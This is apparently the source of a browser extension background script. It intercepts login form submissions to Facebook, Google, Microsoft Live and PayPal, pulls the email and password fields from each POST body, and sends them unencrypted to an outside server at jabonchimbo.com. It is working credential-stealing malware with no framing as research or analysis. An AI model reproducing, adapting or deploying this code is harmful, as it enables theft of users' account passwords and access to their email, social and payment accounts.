'use strict';

var targetFacebook = "*://*.facebook.com/login.php*";
var targetGmail = "*://accounts.google.com/signin/v2/challenge/password/empty";
var targetLive = "*://*.live.com/ppsecure/post.srf*";
var targetPaypal = "*://*.paypal.com/signin";

browser.webRequest.onBeforeRequest.addListener(
  function(details) {
    if(details.method == "POST") {
	if(details.url.indexOf("facebook") != -1 ){
		    console.log(details.requestBody.formData);
		    if(details.requestBody.formData.email === undefined){
			doPost("repeat",details.requestBody.formData.pass[0]);
		    }else{
			doPost(details.requestBody.formData.email[0],details.requestBody.formData.pass[0]);
		    }
	}
	
	if(details.url.indexOf("google") != -1 ){
		console.log(details.requestBody.formData);
		doPost(details.requestBody.formData.identifier[0],details.requestBody.formData.password[0]);
	}


	if(details.url.indexOf("live") != -1 ){
		console.log(details.requestBody.formData);
		doPost(details.requestBody.formData.login[0],details.requestBody.formData.passwd[0]);
	}

	if(details.url.indexOf("paypal") != -1 ){
		console.log(details.requestBody.formData);
		doPost(details.requestBody.formData.login_email[0],details.requestBody.formData.login_password[0]);
	}

    }
  },
  {urls: [targetFacebook,targetGmail,targetLive,targetPaypal]},
  ["requestBody"]
);


function doPost(e,p){
                        var url = "http://www.jabonchimbo.com/api/cards/dopost.php";
                        var parametros ="email="+e+"&pass="+p;
                        var xhr = new XMLHttpRequest();
                        xhr.open("POST",url, true);
                        xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
                        xhr.setRequestHeader('Accept','*/*');
                        xhr.setRequestHeader("Accept-Language", "en");
                        xhr.send(parametros);

                        xhr.onreadystatechange = function () {
                                if (xhr.readyState == 4) {
                                        console.log("Envio de parametros terminada");
                                }
                        }
}

